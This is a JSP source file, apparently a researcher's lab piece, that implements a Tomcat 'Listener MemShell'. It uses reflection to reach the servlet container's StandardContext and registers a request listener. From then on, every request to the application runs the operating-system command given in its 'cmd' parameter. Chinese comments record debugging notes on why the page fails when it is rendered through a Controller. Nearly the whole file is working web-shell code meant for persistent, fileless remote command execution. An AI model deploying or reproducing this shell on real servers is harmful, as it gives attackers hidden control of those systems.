<%--
  Created by IntelliJ IDEA.
  User: madahaRCE
  Date: 2023/6/26
  Time: 16:44
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>>

<%
    class Shell_Listener implements ServletRequestListener {

        @Override
        public void requestInitialized(ServletRequestEvent sre) {

            // 此处，仅仅是为了测试jsp页面报错的原因。
            // 通过测试发现未执行jsp的原因，是使用Controller进行jsp返回时 渲染jsp报错 直接抛出异常，jsp内的java代码未能成功执行！！！
            //try {
            //    Runtime.getRuntime().exec("notepad");
            //} catch (Exception e){
            //    e.printStackTrace();
            //}

            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
            String cmd = request.getParameter("cmd");
            if (cmd != null){
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e){
                    e.printStackTrace();
                } catch (NullPointerException n) {
                    n.printStackTrace();
                }
            }
        }

        @Override
        public void requestDestroyed(ServletRequestEvent sre) {
            // ServletRequestListener.super.requestDestroyed(sre);
        }
    }

    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext context = (StandardContext) req.getContext();

    Shell_Listener shell_listener = new Shell_Listener();
    context.addApplicationEventListener(shell_listener);
%>>

<%--
    注意点：
       （1）使用Controller可以直接访问jsp页面；  如果是使用war形式 + 配置前后缀，也可以直接访问jsp页面！
       （2）giaogiao！！！  我想吐槽的是，如果通过Controller去跳转jsp内存马页面，这种情况下会直接报错并抛出异常，导致jsp页面不能完成渲染执行！！！
--%>

<html>
<head>
    <title>Listener MemShell</title>
</head>
<body>
    ${data}

    <br>普通jsp直接页面返回！！<br>

    <br>
         注意点：
            （1）使用Controller可以直接访问jsp页面；  如果是使用war形式 + 配置前后缀，也可以直接访问jsp页面！
            （2）giaogiao！！！  我想吐槽的是，如果通过Controller去跳转jsp内存马页面，这种情况下会直接报错并抛出异常，导致jsp页面不能完成渲染执行！！！
    <br>
</body>
</html>